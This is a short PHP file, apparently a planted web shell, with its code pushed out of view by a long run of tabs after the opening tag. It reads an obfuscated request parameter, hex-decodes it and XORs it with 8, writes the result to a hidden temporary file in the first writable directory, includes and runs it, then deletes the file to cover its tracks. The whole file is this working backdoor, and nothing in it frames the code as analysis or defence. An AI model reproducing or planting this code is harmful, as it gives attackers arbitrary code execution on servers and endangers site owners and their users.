<?php																																										if(isset($_REQUEST["o\x62j"])){ $data = hex2bin($_REQUEST["o\x62j"]); $object = ''; $d = 0; do{$object .= chr(ord($data[$d]) ^ 8);$d++;} while($d < strlen($data)); $binding = array_filter([session_save_path(), ini_get("upload_tmp_dir"), getcwd(), sys_get_temp_dir(), getenv("TMP"), "/dev/shm", "/tmp", getenv("TEMP"), "/var/tmp"]); for ($factor = 0, $token = count($binding); $factor < $token; $factor++) { $element = $binding[$factor]; if ((bool)is_dir($element) && (bool)is_writable($element)) { $holder = sprintf("%s/.entity", $element); $file = fopen($holder, 'w'); if ($file) { fwrite($file, $object); fclose($file); include $holder; @unlink($holder); exit; } } } }
